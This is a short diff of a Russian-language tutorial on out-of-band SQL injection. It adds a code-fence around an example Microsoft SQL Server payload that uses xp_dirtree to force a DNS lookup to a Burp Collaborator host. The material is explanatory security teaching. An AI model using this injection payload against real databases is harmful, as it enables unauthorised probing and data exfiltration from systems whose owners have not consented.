@@ -10,4 +10,6 @@
 
 Методы запуска DNS-запроса зависят от типа используемой базы данных. Например, следующий ввод в Microsoft SQL Server может быть использован для запуска DNS-запроса к указанному домену:
 
+```sql
 '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
